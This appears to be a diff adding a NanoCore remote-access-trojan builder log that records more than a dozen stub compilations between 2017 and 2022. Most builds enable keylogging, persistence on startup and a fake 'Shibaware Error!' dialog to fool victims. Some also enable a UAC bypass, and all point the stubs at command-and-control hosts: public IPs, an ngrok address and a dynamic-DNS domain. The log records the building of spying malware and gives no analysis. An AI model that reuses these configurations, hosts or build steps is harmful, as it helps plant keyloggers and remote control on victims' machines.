@@ -1,0 +1,497 @@
+
+Tuesday, 05 December 2017
+
+22:18: Compiling 'C:\Users\IEUser\Desktop\NanoCore 1.2.2.0\NanoCore 1.2.2.0\1.exe'..
+22:18: Embedded Plugin - Name: 'SurveillanceEx Plugin', Size: 98.00 KB
+22:18: Host Interface - Size: 19.50 KB
+22:18: BuildTime = 12/06/2017 06:18:17
+22:18: Version = 1.2.2.0
+22:18: Mutex = 5b6d884f-5341-4bdf-99f8-16ef13930138
+22:18: DefaultGroup = Default
+22:18: PrimaryConnectionHost =
+22:18: BackupConnectionHost = 127.0.0.1
+22:18: ConnectionPort = 54984
+22:18: RunOnStartup = False
+22:18: RequestElevation = False
+22:18: BypassUserAccountControl = False
+22:18: ClearZoneIdentifier = True
+22:18: ClearAccessControl = False
+22:18: SetCriticalProcess = False
+22:18: PreventSystemSleep = True
+22:18: ActivateAwayMode = False
+22:18: EnableDebugMode = False
+22:18: RunDelay = 0
+22:18: ConnectDelay = 4000
+22:18: RestartDelay = 5000
+22:18: TimeoutInterval = 5000
+22:18: KeepAliveTimeout = 30000
+22:18: MutexTimeout = 5000
+22:18: LanTimeout = 2500
+22:18: WanTimeout = 8000
+22:18: BufferSize = 65535
+22:18: MaxPacketSize = 10485760
+22:18: GCThreshold = 10485760
+22:18: UseCustomDnsServer = True
+22:18: PrimaryDnsServer = 8.8.8.8
+22:18: BackupDnsServer = 8.8.4.4
+22:18: Converting output architecture from AnyCPU to x86..
+22:18: Stub will only connect to the current 'Alcatraz3222' license.
+22:18: Compiling has succeeded. Size: 202.50 KB
+
+Tuesday, 08 March 2022
+
+23:01: Compiling 'C:\Users\baile\AppData\Local\Temp\Rar$EXa4428.35073\NanoCore 1.2.2.0\Shibaware FIXED.exe'..
+23:01: 
+23:01: Builder Exception ():
+23:01: Compiling has been canceled by the user.    at BuilderSettingsPage.method_16(String string_0, Boolean bool_0)
+23:01: 
+23:01: Compiling 'C:\Users\baile\AppData\Local\Temp\Rar$EXa4428.35073\NanoCore 1.2.2.0\Shibaware FIXED.exe'..
+23:02: Embedded Plugin - Name: 'SurveillanceEx Plugin', Size: 98.00 KB
+23:02: Host Interface - Size: 19.50 KB
+23:02: KeyboardLogging = True
+23:02: BuildTime = 03/09/2022 04:01:59
+23:02: Version = 1.2.2.0
+23:02: Mutex = 37565d46-487b-41fa-a892-f7cad820a3bc
+23:02: DefaultGroup = Default
+23:02: PrimaryConnectionHost = 45.14.195.36
+23:02: BackupConnectionHost = 127.0.0.1
+23:02: ConnectionPort = 54984
+23:02: RunOnStartup = True
+23:02: RequestElevation = False
+23:02: BypassUserAccountControl = False
+23:02: ClearZoneIdentifier = True
+23:02: ClearAccessControl = False
+23:02: SetCriticalProcess = False
+23:02: PreventSystemSleep = True
+23:02: ActivateAwayMode = False
+23:02: EnableDebugMode = False
+23:02: RunDelay = 0
+23:02: ConnectDelay = 4000
+23:02: RestartDelay = 5000
+23:02: TimeoutInterval = 5000
+23:02: KeepAliveTimeout = 30000
+23:02: MutexTimeout = 5000
+23:02: LanTimeout = 2500
+23:02: WanTimeout = 8000
+23:02: BufferSize = 65535
+23:02: MaxPacketSize = 10485760
+23:02: GCThreshold = 10485760
+23:02: UseCustomDnsServer = True
+23:02: PrimaryDnsServer = 8.8.8.8
+23:02: BackupDnsServer = 8.8.4.4
+23:02: ShowInstallationDialog = True
+23:02: InstallationDialogTitle = Shibaware Error!
+23:02: InstallationDialogMessage = ERROR #8859
+23:02: InstallationDialogIcon = 16
+23:02: Converting output architecture from AnyCPU to x86..
+23:02: Stub will only connect to the current 'Alcatraz3222' license.
+23:02: Compiling has succeeded. Size: 202.50 KB
+23:09: Compiling 'C:\Users\baile\AppData\Local\Temp\Rar$EXa4428.35073\NanoCore 1.2.2.0\Shibaware FIXEDV2.exe'..
+23:09: Embedded Plugin - Name: 'SurveillanceEx Plugin', Size: 98.00 KB
+23:09: Host Interface - Size: 19.50 KB
+23:09: KeyboardLogging = True
+23:09: BuildTime = 03/09/2022 04:09:33
+23:09: Version = 1.2.2.0
+23:09: Mutex = be401717-0060-4523-8cec-07ac4af5dd24
+23:09: DefaultGroup = Default
+23:09: PrimaryConnectionHost = 45.14.195.36
+23:09: BackupConnectionHost = 45.14.195.36
+23:09: ConnectionPort = 50070
+23:09: RunOnStartup = True
+23:09: RequestElevation = False
+23:09: BypassUserAccountControl = False
+23:09: ClearZoneIdentifier = True
+23:09: ClearAccessControl = False
+23:09: SetCriticalProcess = False
+23:09: PreventSystemSleep = True
+23:09: ActivateAwayMode = False
+23:09: EnableDebugMode = False
+23:09: RunDelay = 0
+23:09: ConnectDelay = 4000
+23:09: RestartDelay = 5000
+23:09: TimeoutInterval = 5000
+23:09: KeepAliveTimeout = 30000
+23:09: MutexTimeout = 5000
+23:09: LanTimeout = 2500
+23:09: WanTimeout = 8000
+23:09: BufferSize = 65535
+23:09: MaxPacketSize = 10485760
+23:09: GCThreshold = 10485760
+23:09: UseCustomDnsServer = True
+23:09: PrimaryDnsServer = 8.8.8.8
+23:09: BackupDnsServer = 8.8.4.4
+23:09: ShowInstallationDialog = True
+23:09: InstallationDialogTitle = Shibaware Error!
+23:09: InstallationDialogMessage = ERROR #8859
+23:09: InstallationDialogIcon = 16
+23:09: Converting output architecture from AnyCPU to x86..
+23:09: Stub will only connect to the current 'Alcatraz3222' license.
+23:09: Compiling has succeeded. Size: 202.50 KB
+23:14: Compiling 'C:\Users\baile\AppData\Local\Temp\Rar$EXa4428.35073\NanoCore 1.2.2.0\k.exe'..
+23:14: Embedded Plugin - Name: 'SurveillanceEx Plugin', Size: 98.00 KB
+23:14: Host Interface - Size: 19.50 KB
+23:14: KeyboardLogging = True
+23:14: BuildTime = 03/09/2022 04:14:47
+23:14: Version = 1.2.2.0
+23:14: Mutex = 1932000c-dac7-4af0-b466-d137a7c6b5ca
+23:14: DefaultGroup = Default
+23:14: PrimaryConnectionHost = 192.168.1.25
+23:14: BackupConnectionHost = 192.168.1.25
+23:14: ConnectionPort = 8080
+23:14: RunOnStartup = True
+23:14: RequestElevation = False
+23:14: BypassUserAccountControl = False
+23:14: ClearZoneIdentifier = True
+23:14: ClearAccessControl = False
+23:14: SetCriticalProcess = False
+23:14: PreventSystemSleep = True
+23:14: ActivateAwayMode = False
+23:14: EnableDebugMode = False
+23:14: RunDelay = 0
+23:14: ConnectDelay = 4000
+23:14: RestartDelay = 5000
+23:14: TimeoutInterval = 5000
+23:14: KeepAliveTimeout = 29996
+23:14: MutexTimeout = 5000
+23:14: LanTimeout = 2500
+23:14: WanTimeout = 8000
+23:14: BufferSize = 65498
+23:14: MaxPacketSize = 10485760
+23:14: GCThreshold = 10485760
+23:14: UseCustomDnsServer = True
+23:14: PrimaryDnsServer = 8.8.8.8
+23:14: BackupDnsServer = 8.8.4.4
+23:14: ShowInstallationDialog = True
+23:14: InstallationDialogTitle = Shibaware Error!
+23:14: InstallationDialogMessage = ERROR #8859
+23:14: InstallationDialogIcon = 16
+23:14: Converting output architecture from AnyCPU to x86..
+23:14: Stub will only connect to the current 'Alcatraz3222' license.
+23:14: Compiling has succeeded. Size: 202.50 KB
+23:27: Compiling 'C:\Users\baile\AppData\Local\Temp\Rar$EXa4428.35073\NanoCore 1.2.2.0\h.exe'..
+23:27: Embedded Plugin - Name: 'SurveillanceEx Plugin', Size: 98.00 KB
+23:27: Host Interface - Size: 19.50 KB
+23:27: KeyboardLogging = True
+23:27: BuildTime = 03/09/2022 04:27:46
+23:27: Version = 1.2.2.0
+23:27: Mutex = a266741d-3b4f-4a6a-87cf-12d4231deadd
+23:27: DefaultGroup = Default
+23:27: PrimaryConnectionHost = 192.168.1.25
+23:27: BackupConnectionHost = 192.168.1.25
+23:27: ConnectionPort = 8080
+23:27: RunOnStartup = True
+23:27: RequestElevation = False
+23:27: BypassUserAccountControl = False
+23:27: ClearZoneIdentifier = True
+23:27: ClearAccessControl = False
+23:27: SetCriticalProcess = False
+23:27: PreventSystemSleep = True
+23:27: ActivateAwayMode = False
+23:27: EnableDebugMode = False
+23:27: RunDelay = 0
+23:27: ConnectDelay = 4000
+23:27: RestartDelay = 5000
+23:27: TimeoutInterval = 5000
+23:27: KeepAliveTimeout = 29996
+23:27: MutexTimeout = 5000
+23:27: LanTimeout = 2500
+23:27: WanTimeout = 8000
+23:27: BufferSize = 65498
+23:27: MaxPacketSize = 10485760
+23:27: GCThreshold = 10485760
+23:27: UseCustomDnsServer = True
+23:27: PrimaryDnsServer = 8.8.8.8
+23:27: BackupDnsServer = 8.8.4.4
+23:27: ShowInstallationDialog = True
+23:27: InstallationDialogTitle = Shibaware Error!
+23:27: InstallationDialogMessage = ERROR #8859
+23:27: InstallationDialogIcon = 16
+23:27: Converting output architecture from AnyCPU to x86..
+23:27: Stub will only connect to the current 'Alcatraz3222' license.
+23:27: Compiling has succeeded. Size: 202.50 KB
+23:28: Compiling 'C:\Users\baile\AppData\Local\Temp\Rar$EXa4428.35073\NanoCore 1.2.2.0\kkk.exe'..
+23:28: Embedded Plugin - Name: 'SurveillanceEx Plugin', Size: 98.00 KB
+23:28: Host Interface - Size: 19.50 KB
+23:28: KeyboardLogging = True
+23:28: BuildTime = 03/09/2022 04:28:16
+23:28: Version = 1.2.2.0
+23:28: Mutex = 3d83e09d-0ed4-47df-a5a9-81e6a1254245
+23:28: DefaultGroup = Default
+23:28: PrimaryConnectionHost = 69.207.180.32
+23:28: BackupConnectionHost = 69.207.180.32
+23:28: ConnectionPort = 8080
+23:28: RunOnStartup = True
+23:28: RequestElevation = False
+23:28: BypassUserAccountControl = False
+23:28: ClearZoneIdentifier = True
+23:28: ClearAccessControl = False
+23:28: SetCriticalProcess = False
+23:28: PreventSystemSleep = True
+23:28: ActivateAwayMode = False
+23:28: EnableDebugMode = False
+23:28: RunDelay = 0
+23:28: ConnectDelay = 4000
+23:28: RestartDelay = 5000
+23:28: TimeoutInterval = 5000
+23:28: KeepAliveTimeout = 29996
+23:28: MutexTimeout = 5000
+23:28: LanTimeout = 2500
+23:28: WanTimeout = 8000
+23:28: BufferSize = 65498
+23:28: MaxPacketSize = 10485760
+23:28: GCThreshold = 10485760
+23:28: UseCustomDnsServer = True
+23:28: PrimaryDnsServer = 8.8.8.8
+23:28: BackupDnsServer = 8.8.4.4
+23:28: ShowInstallationDialog = True
+23:28: InstallationDialogTitle = Shibaware Error!
+23:28: InstallationDialogMessage = ERROR #8859
+23:28: InstallationDialogIcon = 16
+23:28: Converting output architecture from AnyCPU to x86..
+23:28: Stub will only connect to the current 'Alcatraz3222' license.
+23:28: Compiling has succeeded. Size: 202.50 KB
+23:33: Compiling 'C:\Users\baile\AppData\Local\Temp\Rar$EXa4428.35073\NanoCore 1.2.2.0\HTTPSahckers!.exe'..
+23:33: Embedded Plugin - Name: 'SurveillanceEx Plugin', Size: 98.00 KB
+23:33: Host Interface - Size: 19.50 KB
+23:33: KeyboardLogging = True
+23:33: BuildTime = 03/09/2022 04:33:14
+23:33: Version = 1.2.2.0
+23:33: Mutex = 68b6ac9a-f605-4c5b-ab6a-c4082518c0a7
+23:33: DefaultGroup = HTTPS
+23:33: PrimaryConnectionHost = 69.207.180.32
+23:33: BackupConnectionHost = 69.207.180.32
+23:33: ConnectionPort = 8080
+23:33: RunOnStartup = True
+23:33: RequestElevation = False
+23:33: BypassUserAccountControl = False
+23:33: ClearZoneIdentifier = True
+23:33: ClearAccessControl = False
+23:33: SetCriticalProcess = False
+23:33: PreventSystemSleep = True
+23:33: ActivateAwayMode = False
+23:33: EnableDebugMode = False
+23:33: RunDelay = 0
+23:33: ConnectDelay = 4000
+23:33: RestartDelay = 5000
+23:33: TimeoutInterval = 5000
+23:33: KeepAliveTimeout = 29996
+23:33: MutexTimeout = 5000
+23:33: LanTimeout = 2500
+23:33: WanTimeout = 8000
+23:33: BufferSize = 65498
+23:33: MaxPacketSize = 10485760
+23:33: GCThreshold = 10485760
+23:33: UseCustomDnsServer = True
+23:33: PrimaryDnsServer = 8.8.8.8
+23:33: BackupDnsServer = 8.8.4.4
+23:33: ShowInstallationDialog = True
+23:33: InstallationDialogTitle = Shibaware Error!
+23:33: InstallationDialogMessage = ERROR #8859
+23:33: InstallationDialogIcon = 16
+23:33: Converting output architecture from AnyCPU to x86..
+23:33: Stub will only connect to the current 'Alcatraz3222' license.
+23:33: Compiling has succeeded. Size: 202.50 KB
+23:42: Compiling 'C:\Users\baile\AppData\Local\Temp\Rar$EXa4428.35073\NanoCore 1.2.2.0\shitter.exe'..
+23:42: Embedded Plugin - Name: 'SurveillanceEx Plugin', Size: 98.00 KB
+23:42: Host Interface - Size: 19.50 KB
+23:42: KeyboardLogging = True
+23:42: BuildTime = 03/09/2022 04:42:44
+23:42: Version = 1.2.2.0
+23:42: Mutex = ee841e3f-027b-4df2-b2f5-26a4cad1a77c
+23:42: DefaultGroup = HTTPS
+23:42: PrimaryConnectionHost = 8b69-107-175-102-176.ngrok.io
+23:42: BackupConnectionHost = 8b69-107-175-102-176.ngrok.io
+23:42: ConnectionPort = 80
+23:42: RunOnStartup = True
+23:42: RequestElevation = False
+23:42: BypassUserAccountControl = False
+23:42: ClearZoneIdentifier = True
+23:42: ClearAccessControl = False
+23:42: SetCriticalProcess = False
+23:42: PreventSystemSleep = True
+23:42: ActivateAwayMode = False
+23:42: EnableDebugMode = False
+23:42: RunDelay = 0
+23:42: ConnectDelay = 4000
+23:42: RestartDelay = 5000
+23:42: TimeoutInterval = 5000
+23:42: KeepAliveTimeout = 29996
+23:42: MutexTimeout = 5000
+23:42: LanTimeout = 2500
+23:42: WanTimeout = 8000
+23:42: BufferSize = 65498
+23:42: MaxPacketSize = 10485760
+23:42: GCThreshold = 10485760
+23:42: UseCustomDnsServer = True
+23:42: PrimaryDnsServer = 8.8.8.8
+23:42: BackupDnsServer = 8.8.4.4
+23:42: ShowInstallationDialog = True
+23:42: InstallationDialogTitle = Shibaware Error!
+23:42: InstallationDialogMessage = ERROR #8859
+23:42: InstallationDialogIcon = 16
+23:42: Converting output architecture from AnyCPU to x86..
+23:42: Stub will only connect to the current 'Alcatraz3222' license.
+23:42: Compiling has succeeded. Size: 202.50 KB
+23:44: Compiling 'C:\Users\baile\AppData\Local\Temp\Rar$EXa4428.35073\NanoCore 1.2.2.0\jefiwr0h.exe'..
+23:44: Embedded Plugin - Name: 'SurveillanceEx Plugin', Size: 98.00 KB
+23:44: Host Interface - Size: 19.50 KB
+23:44: KeyboardLogging = True
+23:44: BuildTime = 03/09/2022 04:44:39
+23:44: Version = 1.2.2.0
+23:44: Mutex = 4fd0f254-9db1-4e82-9987-e391c24058b0
+23:44: DefaultGroup = HTTPS
+23:44: PrimaryConnectionHost = 8b69-107-175-102-176.ngrok.io
+23:44: BackupConnectionHost = 8b69-107-175-102-176.ngrok.io
+23:44: ConnectionPort = 80
+23:44: RunOnStartup = True
+23:44: RequestElevation = False
+23:44: BypassUserAccountControl = False
+23:44: ClearZoneIdentifier = True
+23:44: ClearAccessControl = False
+23:44: SetCriticalProcess = False
+23:44: PreventSystemSleep = True
+23:44: ActivateAwayMode = False
+23:44: EnableDebugMode = False
+23:44: RunDelay = 3
+23:44: ConnectDelay = 4012
+23:44: RestartDelay = 5000
+23:44: TimeoutInterval = 5000
+23:44: KeepAliveTimeout = 29996
+23:44: MutexTimeout = 5000
+23:44: LanTimeout = 2500
+23:44: WanTimeout = 8000
+23:44: BufferSize = 65498
+23:44: MaxPacketSize = 10485760
+23:44: GCThreshold = 10485760
+23:44: UseCustomDnsServer = True
+23:44: PrimaryDnsServer = 8.8.8.8
+23:44: BackupDnsServer = 8.8.4.4
+23:44: ShowInstallationDialog = True
+23:44: InstallationDialogTitle = Shibaware Error!
+23:44: InstallationDialogMessage = ERROR #8859
+23:44: InstallationDialogIcon = 16
+23:44: Converting output architecture from AnyCPU to x86..
+23:44: Stub will only connect to the current 'Alcatraz3222' license.
+23:44: Compiling has succeeded. Size: 202.50 KB
+
+Wednesday, 09 March 2022
+
+00:32: Compiling 'C:\Users\baile\AppData\Local\Temp\Rar$EXa14988.581\NanoCore 1.2.2.0\ggg.exe'..
+00:32: Embedded Plugin - Name: 'SurveillanceEx Plugin', Size: 98.00 KB
+00:32: Host Interface - Size: 19.50 KB
+00:32: KeyboardLogging = True
+00:32: BuildTime = 03/09/2022 05:32:19
+00:32: Version = 1.2.2.0
+00:32: Mutex = ee15a86b-2119-490b-99fb-dc73aaef8b00
+00:32: DefaultGroup = Default
+00:32: PrimaryConnectionHost = Nanocoretrolling.chickenkiller.com
+00:32: BackupConnectionHost = Nanocoretrolling.chickenkiller.com
+00:32: ConnectionPort = 8080
+00:32: RunOnStartup = True
+00:32: RequestElevation = False
+00:32: BypassUserAccountControl = False
+00:32: ClearZoneIdentifier = True
+00:32: ClearAccessControl = False
+00:32: SetCriticalProcess = False
+00:32: PreventSystemSleep = True
+00:32: ActivateAwayMode = False
+00:32: EnableDebugMode = False
+00:32: RunDelay = 0
+00:32: ConnectDelay = 4000
+00:32: RestartDelay = 5000
+00:32: TimeoutInterval = 5000
+00:32: KeepAliveTimeout = 30000
+00:32: MutexTimeout = 5000
+00:32: LanTimeout = 2500
+00:32: WanTimeout = 8000
+00:32: BufferSize = 65535
+00:32: MaxPacketSize = 10485760
+00:32: GCThreshold = 10485760
+00:32: UseCustomDnsServer = True
+00:32: PrimaryDnsServer = 8.8.8.8
+00:32: BackupDnsServer = 8.8.4.4
+00:32: Converting output architecture from AnyCPU to x86..
+00:32: Stub will only connect to the current 'Alcatraz3222' license.
+00:32: Compiling has succeeded. Size: 202.50 KB
+
+Wednesday, 09 March 2022
+
+20:14: Compiling 'C:\Users\baile\Downloads\NanoCore 1.2.2.0\SwindelsRATMaker.exe'..
+20:14: Embedded Plugin - Name: 'SurveillanceEx Plugin', Size: 98.00 KB
+20:14: Host Interface - Size: 19.50 KB
+20:14: KeyboardLogging = True
+20:14: BuildTime = 03/10/2022 01:14:42
+20:14: Version = 1.2.2.0
+20:14: Mutex = 7d7cc63b-cd9b-4f36-baed-696c27691d11
+20:14: DefaultGroup = Default
+20:14: PrimaryConnectionHost = 69.207.180.32
+20:14: BackupConnectionHost = 69.207.180.32
+20:14: ConnectionPort = 54984
+20:14: RunOnStartup = True
+20:14: RequestElevation = True
+20:14: BypassUserAccountControl = True
+20:14: BypassUserAccountControlData = System.Byte[]
+20:14: ClearZoneIdentifier = True
+20:14: ClearAccessControl = False
+20:14: SetCriticalProcess = False
+20:14: PreventSystemSleep = True
+20:14: ActivateAwayMode = False
+20:14: EnableDebugMode = False
+20:14: RunDelay = 0
+20:14: ConnectDelay = 4000
+20:14: RestartDelay = 5000
+20:14: TimeoutInterval = 5000
+20:14: KeepAliveTimeout = 30000
+20:14: MutexTimeout = 5000
+20:14: LanTimeout = 2500
+20:14: WanTimeout = 8000
+20:14: BufferSize = 65535
+20:14: MaxPacketSize = 10485760
+20:14: GCThreshold = 10485760
+20:14: UseCustomDnsServer = True
+20:14: PrimaryDnsServer = 8.8.8.8
+20:14: BackupDnsServer = 8.8.4.4
+20:14: Converting output architecture from AnyCPU to x86..
+20:14: Stub will only connect to the current 'Alcatraz3222' license.
+20:14: Compiling has succeeded. Size: 203.00 KB
+
+Thursday, 10 March 2022
+
+23:24: Compiling 'C:\Users\baile\Downloads\NanoCore 1.2.2.0\trol.exe'..
+23:24: Embedded Plugin - Name: 'SurveillanceEx Plugin', Size: 98.00 KB
+23:24: Host Interface - Size: 19.50 KB
+23:24: KeyboardLogging = True
+23:24: BuildTime = 03/11/2022 04:24:08
+23:24: Version = 1.2.2.0
+23:24: Mutex = fe3db4c8-fabb-4782-a46a-d2557a649964
+23:24: DefaultGroup = Default
+23:24: PrimaryConnectionHost = 69.207.180.32
+23:24: BackupConnectionHost = 69.207.180.32
+23:24: ConnectionPort = 54984
+23:24: RunOnStartup = True
+23:24: RequestElevation = True
+23:24: BypassUserAccountControl = True
+23:24: BypassUserAccountControlData = System.Byte[]
+23:24: ClearZoneIdentifier = True
+23:24: ClearAccessControl = False
+23:24: SetCriticalProcess = False
+23:24: PreventSystemSleep = True
+23:24: ActivateAwayMode = False
+23:24: EnableDebugMode = False
+23:24: RunDelay = 0
+23:24: ConnectDelay = 4000
+23:24: RestartDelay = 5000
+23:24: TimeoutInterval = 5000
+23:24: KeepAliveTimeout = 30000
+23:24: MutexTimeout = 5000
+23:24: LanTimeout = 2500
+23:24: WanTimeout = 8000
+23:24: BufferSize = 65535
+23:24: MaxPacketSize = 10485760
+23:24: GCThreshold = 10485760
+23:24: UseCustomDnsServer = True
+23:24: PrimaryDnsServer = 8.8.8.8
+23:24: BackupDnsServer = 8.8.4.4
+23:24: Converting output architecture from AnyCPU to x86..
+23:24: Stub will only connect to the current 'Alcatraz3222' license.
+23:24: Compiling has succeeded. Size: 203.00 KB
